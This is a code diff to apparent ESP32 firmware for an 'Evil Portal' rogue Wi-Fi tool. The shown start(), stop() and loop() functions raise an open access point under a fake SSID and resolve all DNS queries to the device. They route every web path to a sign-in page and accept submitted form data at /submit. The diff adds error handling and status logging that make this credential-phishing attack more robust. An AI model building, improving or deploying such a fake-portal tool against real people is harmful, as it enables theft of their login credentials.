@@ -74,38 +74,67 @@ bool start(const String &fakeSsid, uint32_t maxDurationMs) {
 
     ensureLogFile();
 
-    WiFi.softAP(fakeSsid.c_str()); // open network, matches how most captive portals present
+    if (!WiFi.softAP(fakeSsid.c_str())) {
+        Serial.println("✗ Failed to start SoftAP");
+        return false;
+    }
     IPAddress apIP = WiFi.softAPIP();
+    Serial.println("✓ SoftAP started at " + apIP.toString());
 
     g_dns = new DNSServer();
-    g_dns->start(53, "*", apIP);
+    if (!g_dns) {
+        Serial.println("✗ Failed to allocate DNSServer");
+        return false;
+    }
+    if (!g_dns->start(53, "*", apIP)) {
+        Serial.println("✗ Failed to start DNS server");
+        delete g_dns;
+        g_dns = nullptr;
+        return false;
+    }
+    Serial.println("✓ DNS server started");
 
     g_server = new WebServer(80);
+    if (!g_server) {
+        Serial.println("✗ Failed to allocate WebServer");
+        delete g_dns;
+        g_dns = nullptr;
+        return false;
+    }
     g_server->on("/", handleRoot);
     g_server->on("/submit", HTTP_POST, handleSubmit);
-    g_server->onNotFound(handleRoot); // any unknown path resolves to the sign-in page
+    g_server->onNotFound(handleRoot);
     g_server->begin();
+    Serial.println("✓ Web server started on port 80");
 
     g_deadline = millis() + maxDurationMs;
     g_active = true;
+    Serial.println("✓ Evil Portal active");
     return true;
 }
 
 void stop() {
     if (!g_active) return;
-    g_server->stop();
-    delete g_server;
-    g_server = nullptr;
-    g_dns->stop();
-    delete g_dns;
-    g_dns = nullptr;
+
+    if (g_server) {
+        g_server->stop();
+        delete g_server;
+        g_server = nullptr;
+    }
+
+    if (g_dns) {
+        g_dns->stop();
+        delete g_dns;
+        g_dns = nullptr;
+    }
+
     g_active = false;
 }
 
 void loop() {
     if (!g_active) return;
-    g_dns->processNextRequest();
-    g_server->handleClient();
+    if (g_dns) g_dns->processNextRequest();
+    if (g_server) g_server->handleClient();
     if ((int32_t)(millis() - g_deadline) > 0) stop();
 }
 
